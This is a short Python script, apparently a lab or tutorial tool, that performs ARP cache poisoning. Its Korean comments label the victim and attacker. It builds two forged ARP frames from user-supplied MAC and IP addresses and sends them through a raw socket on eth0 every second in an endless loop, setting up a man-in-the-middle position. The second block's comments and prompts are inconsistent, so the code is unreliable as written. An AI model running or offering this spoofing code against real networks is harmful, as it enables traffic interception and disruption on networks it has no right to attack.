import socket
import struct
import time
from new_packet_sniffer import Ethernet, ARP

eth = Ethernet()
arp = ARP()

# 피해자 Mac 주소
eth.dst = input("피해자 Mac 주소 : ")
# 공격자 Mac 주소
eth.src = input("공격자 Mac 주소 : ")
eth.type = 0x0806

arp.hw_type = 0x0001
arp.proc_type = 0x0800
arp.hw_size = 6
arp.proc_size = 4
arp.opcode = 0x0001
# 타겟의 Mac 정보로 입력될 가짜 Mac 정보
arp.smac = input("타겟의 Mac 정보로 입력될 가짜 Mac 정보 : ")
# 타겟 IP 주소
arp.sip = input("타겟 IP 주소 : ")
arp.dmac = '00:00:00:00:00:00'
# 피해자 IP 주소
arp.dip = input("피해자 IP 주소 : ")

frame =  eth.get_header() + arp.get_header()

#####################################################################

eth2 = Ethernet()
arp2 = ARP()

# 피해자 Mac 주소
eth2.dst = input("타겟 Mac 주소 : ")
# 공격자 Mac 주소
eth2.src = input("공격자 Mac 주소 : ")
eth2.type = 0x0806

arp2.hw_type = 0x0001
arp2.proc_type = 0x0800
arp2.hw_size = 6
arp2.proc_size = 4
arp2.opcode = 0x0001
# 타겟의 Mac 정보로 입력될 가짜 Mac 정보
arp2.smac = input("피해자의 Mac 정보로 입력될 가짜 Mac 정보 : ")
# 타겟 IP 주소
arp2.sip = input("피해자의 IP 주소 : ")
arp2.dmac = '00:00:00:00:00:00'
# 피해자 IP 주소
arp2.dip = input("피해자 IP 주소 : ")
frame2 = eth2.get_header() + arp2.get_header()

######################################################################

sock = socket.socket( socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003) )
sock.bind( ('eth0',0) )

while True:
  time.sleep(1)
  sock.send( frame )
  sock.send( frame2 )

